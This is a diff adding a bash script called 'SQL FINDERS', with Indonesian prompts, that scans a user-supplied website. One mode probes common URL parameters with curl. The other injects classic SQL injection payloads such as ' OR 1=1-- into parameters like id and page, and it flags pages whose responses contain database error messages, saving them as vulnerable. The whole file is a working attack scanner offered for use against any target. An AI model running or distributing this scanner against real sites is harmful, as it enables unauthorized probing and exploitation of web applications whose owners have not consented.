@@ -1,0 +1,143 @@
+#!/bin/bash
+# TOOLS: SQL FINDERS
+# AUTHOR: watesn1smXvst
+# VERSION: 1.0
+
+# warna
+R='\033[91m'
+G='\033[92m'
+Y='\033[93m'
+B='\033[94m'
+C='\033[96m'
+reset='\033[0m'
+
+clear
+echo "[+] SQL FINDERS BY watesn1smXvst [+]"
+echo "====================================="
+echo ""
+echo "PILIH MODE:"
+echo "1. AutoParameter"
+echo "2. SQLi-Autos"
+echo "====================================="
+read -p "[?] Pilih [1/2]: " choice
+
+parameter_list=(
+    "id" "page" "cat" "product" "detail" "news" "art" "post" "view"
+    "show" "item" "code" "num" "no" "kode" "idx" "ref" "uid" "sid"
+    "q" "s" "search" "query" "keyword" "tag" "author" "user" "userid"
+)
+
+auto_parameter() {
+    target=$1
+    echo ""
+    echo "[+] Target: $target"
+    echo "[+] Scanning parameter sensitif..."
+    echo ""
+    
+    if [[ ! $target =~ ^http ]]; then
+        target="http://$target"
+    fi
+    
+    found=0
+    for param in "${parameter_list[@]:0:15}"; do
+        test_url="$target?$param=1"
+        status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$test_url" 2>/dev/null)
+        
+        if [[ $status == "200" ]]; then
+            echo -e "[${G}OK${reset}] $test_url"
+            echo "$test_url" >> param_results.txt
+            ((found++))
+        elif [[ $status == "403" ]]; then
+            echo -e "[${Y}403${reset}] $test_url"
+        elif [[ $status == "404" ]]; then
+            echo -e "[${R}404${reset}] $test_url"
+        else
+            echo -e "[${C}$status${reset}] $test_url"
+        fi
+        sleep 0.3
+    done
+    
+    echo ""
+    echo "[+] Total parameter ditemukan: $found"
+    if [[ $found -gt 0 ]]; then
+        echo "[+] Hasil disimpan di param_results.txt"
+    fi
+}
+
+sqli_autos() {
+    target=$1
+    echo ""
+    echo "[+] Target: $target"
+    echo "[+] Memulai scan SQL Injection..."
+    echo ""
+    
+    if [[ ! $target =~ ^http ]]; then
+        target="http://$target"
+    fi
+    
+    payloads=(
+        "'" 
+        "\""
+        "' OR '1'='1"
+        "\" OR \"1\"=\"1"
+        "' OR 1=1--"
+        "\" OR 1=1--"
+    )
+    
+    test_params=("id" "page" "cat" "detail" "post" "view")
+    found_vuln=0
+    
+    for param in "${test_params[@]}"; do
+        for payload in "${payloads[@]}"; do
+            test_url="$target?$param=$payload"
+            
+            response=$(curl -s --max-time 10 "$test_url" 2>/dev/null)
+            status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$test_url" 2>/dev/null)
+            
+            if [[ $status == "404" ]]; then
+                echo -e "[${R}404 NOT FOUND${reset}] $test_url"
+            else
+                if echo "$response" | grep -qiE "mysql|sql syntax|microsoft ole db|odbc driver|oracle|postgresql|sqlite|unclosed quotation|you have an error"; then
+                    echo -e "[${R}VULN${reset}] $test_url"
+                    echo "$test_url" >> sqli_results.txt
+                    ((found_vuln++))
+                else
+                    echo -e "[${Y}$status${reset}] $test_url"
+                fi
+            fi
+            sleep 0.5
+        done
+    done
+    
+    echo ""
+    echo "[+] Scan selesai!"
+    if [[ $found_vuln -gt 0 ]]; then
+        echo -e "[${R}VULN FOUND${reset}] $found_vuln titik rentan"
+        echo "[+] Hasil disimpan di sqli_results.txt"
+    else
+        echo -e "[${Y}NO VULN${reset}] Tidak ditemukan celah SQL Injection"
+    fi
+}
+
+case $choice in
+    1)
+        read -p "[?] Masukkan web target: " target
+        if [[ -z $target ]]; then
+            echo "[!] Target tidak boleh kosong!"
+            exit 1
+        fi
+        auto_parameter "$target"
+        ;;
+    2)
+        read -p "[?] Masukkan web target: " target
+        if [[ -z $target ]]; then
+            echo "[!] Target tidak boleh kosong!"
+            exit 1
+        fi
+        sqli_autos "$target"
+        ;;
+    *)
+        echo "[!] Pilihan tidak valid!"
+        exit 1
+        ;;
+esac
